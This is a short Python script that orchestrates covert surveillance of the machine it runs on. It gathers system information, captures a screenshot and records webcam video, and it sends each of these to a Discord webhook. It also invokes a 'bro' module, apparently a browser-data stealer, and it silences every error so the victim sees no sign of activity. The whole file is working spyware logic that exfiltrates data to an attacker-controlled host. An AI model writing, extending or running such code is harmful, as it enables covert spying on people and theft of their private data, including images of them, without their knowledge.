from cap import take_screenshot, send_screenshot
import cam
from lpc import get_system_info
from bro import main
import os

def capture_and_send(webhook_url, video_duration=10, num_cameras=1):
    try:
        # Step 1: Get system information and send it to Discord
        get_system_info(webhook_url)

        # Step 2: Take a screenshot
        screenshot_path = take_screenshot()

        # Step 3: Send the screenshot to Discord
        send_screenshot(screenshot_path)

        # Step 4: Record a video from the webcam
        video_path = cam.record_video(video_duration=video_duration, num_cameras=num_cameras)

        # Step 5: Send the video to Discord
        cam.send_video_to_discord(video_path)

        # Step 6: Execute the main function from bro (if necessary)
        main(webhook_url)


    except Exception as e:
        print("")